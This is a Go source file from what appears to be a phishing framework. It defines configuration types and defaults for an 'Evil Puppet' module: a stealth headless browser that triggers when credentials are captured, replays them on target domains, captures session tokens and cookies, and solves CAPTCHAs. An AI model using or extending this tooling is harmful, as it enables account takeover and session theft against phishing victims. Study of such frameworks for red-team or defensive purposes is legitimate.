package core

// PuppetConfig holds Evil Puppet configuration
type PuppetConfig struct {
	Enabled        bool               `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	CaptchaService string             `mapstructure:"captcha_service" json:"captcha_service" yaml:"captcha_service"`
	CaptchaAPIKey  string             `mapstructure:"captcha_api_key" json:"captcha_api_key" yaml:"captcha_api_key"`
	Triggers       []PuppetTrigger    `mapstructure:"triggers" json:"triggers" yaml:"triggers"`
	Stealth        PuppetStealth      `mapstructure:"stealth" json:"stealth" yaml:"stealth"`
	Browser        PuppetBrowser      `mapstructure:"browser" json:"browser" yaml:"browser"`
	Interceptors   []PuppetInterceptor `mapstructure:"interceptors" json:"interceptors" yaml:"interceptors"`
}

// PuppetStealth configuration for browser stealth
type PuppetStealth struct {
	Enabled          bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	UserAgent        string `mapstructure:"user_agent" json:"user_agent" yaml:"user_agent"`
	ViewportWidth    int    `mapstructure:"viewport_width" json:"viewport_width" yaml:"viewport_width"`
	ViewportHeight   int    `mapstructure:"viewport_height" json:"viewport_height" yaml:"viewport_height"`
	Timezone         string `mapstructure:"timezone" json:"timezone" yaml:"timezone"`
	Locale           string `mapstructure:"locale" json:"locale" yaml:"locale"`
	Geolocation      string `mapstructure:"geolocation" json:"geolocation" yaml:"geolocation"` // "allow" or "block"
	RandomizeFingerprint bool `mapstructure:"randomize_fingerprint" json:"randomize_fingerprint" yaml:"randomize_fingerprint"`
}

// PuppetBrowser configuration
type PuppetBrowser struct {
	Headless        bool     `mapstructure:"headless" json:"headless" yaml:"headless"`
	Timeout         int      `mapstructure:"timeout" json:"timeout" yaml:"timeout"` // seconds
	MaxRetries      int      `mapstructure:"max_retries" json:"max_retries" yaml:"max_retries"`
	ProxyEnabled    bool     `mapstructure:"proxy_enabled" json:"proxy_enabled" yaml:"proxy_enabled"`
	ProxyAddress    string   `mapstructure:"proxy_address" json:"proxy_address" yaml:"proxy_address"`
	ProxyPort       int      `mapstructure:"proxy_port" json:"proxy_port" yaml:"proxy_port"`
	ProxyUsername   string   `mapstructure:"proxy_username" json:"proxy_username" yaml:"proxy_username"`
	ProxyPassword   string   `mapstructure:"proxy_password" json:"proxy_password" yaml:"proxy_password"`
	Args            []string `mapstructure:"args" json:"args" yaml:"args"`
}

// PuppetTrigger defines when to activate puppet
type PuppetTrigger struct {
	Id           string         `mapstructure:"id" json:"id" yaml:"id"`
	Enabled      bool           `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	Name         string         `mapstructure:"name" json:"name" yaml:"name"`
	Description  string         `mapstructure:"description" json:"description" yaml:"description"`
	Domains      []string       `mapstructure:"domains" json:"domains" yaml:"domains"`           // Target domains
	Paths        []string       `mapstructure:"paths" json:"paths" yaml:"paths"`                 // Target paths
	Token        string         `mapstructure:"token" json:"token" yaml:"token"`                 // Primary token (legacy)
	Tokens       []string       `mapstructure:"tokens" json:"tokens" yaml:"tokens"`              // List of tokens to capture
	OpenUrl      string         `mapstructure:"open_url" json:"open_url" yaml:"open_url"`       // URL to open in puppet
	Phishlet     string         `mapstructure:"phishlet" json:"phishlet" yaml:"phishlet"`       // Associated phishlet
	AutoActivate bool           `mapstructure:"auto_activate" json:"auto_activate" yaml:"auto_activate"` // Auto start on cred capture
	ExtractCookies bool         `mapstructure:"extract_cookies" json:"extract_cookies" yaml:"extract_cookies"`
	AbortOriginal bool          `mapstructure:"abort_original" json:"abort_original" yaml:"abort_original"`
	Actions      []PuppetAction `mapstructure:"actions" json:"actions" yaml:"actions"`
}

// PuppetAction defines an action to perform
type PuppetAction struct {
	Selector string `mapstructure:"selector" json:"selector" yaml:"selector"`
	Value    string `mapstructure:"value" json:"value" yaml:"value"`
	WaitCred string `mapstructure:"wait_cred" json:"wait_cred" yaml:"wait_cred"` // Wait for this credential to be available
	Enter    bool   `mapstructure:"enter" json:"enter" yaml:"enter"`
	Click    bool   `mapstructure:"click" json:"click" yaml:"click"`
	PostWait int    `mapstructure:"post_wait" json:"post_wait" yaml:"post_wait"` // milliseconds
	Required bool   `mapstructure:"required" json:"required" yaml:"required"`    // Fail if not found
	Timeout  int    `mapstructure:"timeout" json:"timeout" yaml:"timeout"`       // milliseconds
}

// PuppetInterceptor defines how to intercept requests
type PuppetInterceptor struct {
	Token      string `mapstructure:"token" json:"token" yaml:"token"`
	UrlPattern string `mapstructure:"url_pattern" json:"url_pattern" yaml:"url_pattern"` // regex
	Method     string `mapstructure:"method" json:"method" yaml:"method"`                // GET, POST, etc.
	Parameter  string `mapstructure:"parameter" json:"parameter" yaml:"parameter"`       // param name containing token
	Abort      bool   `mapstructure:"abort" json:"abort" yaml:"abort"`                   // abort original request
}

// PuppetSession holds active puppet session data
// type PuppetSession struct {
// 	Id            string                 `mapstructure:"id" json:"id" yaml:"id"`
// 	TriggerId     string                 `mapstructure:"trigger_id" json:"trigger_id" yaml:"trigger_id"`
// 	VictimSession string                 `mapstructure:"victim_session" json:"victim_session" yaml:"victim_session"`
// 	Status        string                 `mapstructure:"status" json:"status" yaml:"status"` // "pending", "running", "completed", "failed"
// 	TokenValue    string                 `mapstructure:"token_value" json:"token_value" yaml:"token_value"`
// 	Cookies       []map[string]interface{} `mapstructure:"cookies" json:"cookies" yaml:"cookies"`
// 	StartedAt     time.Time              `mapstructure:"started_at" json:"started_at" yaml:"started_at"`
// 	CompletedAt   time.Time              `mapstructure:"completed_at" json:"completed_at" yaml:"completed_at"`
// 	Error         string                 `mapstructure:"error" json:"error" yaml:"error"`
// }

// Default Puppet configuration
func NewDefaultPuppetConfig() *PuppetConfig {
	return &PuppetConfig{
		Enabled:        false,
		CaptchaService: "2captcha",
		CaptchaAPIKey:  "",
		Stealth: PuppetStealth{
			Enabled:          true,
			UserAgent:        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
			ViewportWidth:    1280,
			ViewportHeight:   720,
			Timezone:         "America/New_York",
			Locale:           "en-US",
			Geolocation:      "block",
			RandomizeFingerprint: true,
		},
		Browser: PuppetBrowser{
			Headless:      true,
			Timeout:       60,
			MaxRetries:    3,
			ProxyEnabled:  false,
			ProxyAddress:  "",
			ProxyPort:     0,
			Args: []string{
				"--no-sandbox",
				"--disable-setuid-sandbox",
				"--disable-dev-shm-usage",
				"--disable-gpu",
				"--disable-blink-features=AutomationControlled",
			},
		},
		Triggers:     []PuppetTrigger{},
		Interceptors: []PuppetInterceptor{},
	}
}